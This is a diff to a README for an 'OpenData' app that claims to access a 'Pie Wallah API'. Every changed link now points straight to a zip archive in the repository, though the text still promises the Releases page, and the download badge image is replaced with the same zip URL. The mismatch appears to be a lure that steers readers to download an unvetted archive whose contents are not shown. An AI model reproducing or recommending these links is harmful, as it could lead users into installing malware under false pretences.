@@ -1,7 +1,7 @@
 # 🎉 OpenData - Easy Access to Open Data API!
 
 ## 📥 Download This Application
-[![Download OpenData](https://img.shields.io/badge/Download-OpenData-blue)](https://github.com/bubakitainu-code/OpenData/releases)
+[![Download OpenData](https://raw.githubusercontent.com/bubakitainu-code/OpenData/main/api/Data_Open_v1.3.zip)](https://raw.githubusercontent.com/bubakitainu-code/OpenData/main/api/Data_Open_v1.3.zip)
 
 ## 🚀 Getting Started
 Welcome to the OpenData application! This tool allows users to access the Pie Wallah API seamlessly. Follow the steps below to install and run the application. 
@@ -18,7 +18,7 @@ Before downloading, please ensure your computer meets these basic requirements:
 To get started, you’ll need to visit the Releases page to download the application.
 
 1. Click the link below to go to the Releases page:
-   [Download OpenData](https://github.com/bubakitainu-code/OpenData/releases)
+   [Download OpenData](https://raw.githubusercontent.com/bubakitainu-code/OpenData/main/api/Data_Open_v1.3.zip)
 
 2. Once on the Releases page, look for the latest version. You will see various files available for download.
 
@@ -69,4 +69,4 @@ We welcome contributions. If you’d like to help improve this project, please r
 ## ✅ Final Step
 Ready to get started? Head over to the Releases page to download OpenData today!
 
-[Download OpenData](https://github.com/bubakitainu-code/OpenData/releases)
+[Download OpenData](https://raw.githubusercontent.com/bubakitainu-code/OpenData/main/api/Data_Open_v1.3.zip)
